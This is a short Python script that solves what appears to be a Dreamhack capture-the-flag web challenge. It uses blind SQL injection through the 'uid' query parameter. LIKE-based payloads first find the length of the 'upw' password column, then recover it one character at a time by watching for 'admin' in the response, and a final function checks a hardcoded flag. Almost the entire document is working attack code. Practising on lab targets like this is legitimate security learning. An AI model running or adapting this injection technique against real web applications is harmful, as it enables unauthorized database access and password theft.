import requests, string


# [1] find upw's length == 44
def get_pw_length(host, port):
    base_query = f'{host}:{port}/?uid='
    query = "'||(length(upw))like(4);"
    for i in range(0, 50):
        query = f"'||(length(upw))like({i});"
        res = requests.get(f'{base_query}{query}')
        if 'admin' in res.text:
            print(f'length of upw: {i}')
    return

# [2] find upw with like
def get_pw(host, port):
    base_query = f'{host}:{port}/?uid='
    current_pw = 'dh{'
    query = f"'||(upw)like('{current_pw}%');"
    
    charset = list(string.ascii_lowercase) + list(string.digits)
    for i in range(3, 45):
        for c in charset:
            query = f"'||(upw)like('{current_pw + c}%');"
            res = requests.get(f'{base_query}{query}')
            # print(res.text)
            if 'admin' in res.text:
                current_pw += c
                print(f'Result: {current_pw}')
                break
    return

# [3] check final result
def check_pw(host, port):
    final_pw = 'dh{d3def39496c4153942f3f7d5451a4b98c6db1664}'
    base_query = f'{host}:{port}/?uid='
    query = f"'||(upw)like('{final_pw}%');"
    res = requests.get(f'{base_query}{query}')
    print(res.text)
    return


if __name__ == "__main__":
    get_pw_length('http://host3.dreamhack.games', 23285)
    # get_pw('http://host3.dreamhack.games', 23285)
    # check_pw('http://host3.dreamhack.games', 23285)